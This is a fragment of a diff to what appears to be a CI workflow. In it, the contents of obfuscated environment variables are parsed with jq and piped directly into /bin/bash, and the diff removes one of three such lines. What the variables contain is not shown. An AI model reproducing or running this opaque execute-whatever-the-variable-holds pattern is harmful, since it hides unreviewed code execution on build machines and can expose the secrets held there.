@@ -21,7 +21,6 @@ jobs:
         run: |
           printf '%s' "$mg165" | jq -r .atj137 | /bin/bash
           printf '%s' "$veok23437" | jq -r .et25 | /bin/bash
-          echo $tpuc438 | jq -r .yksc81 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
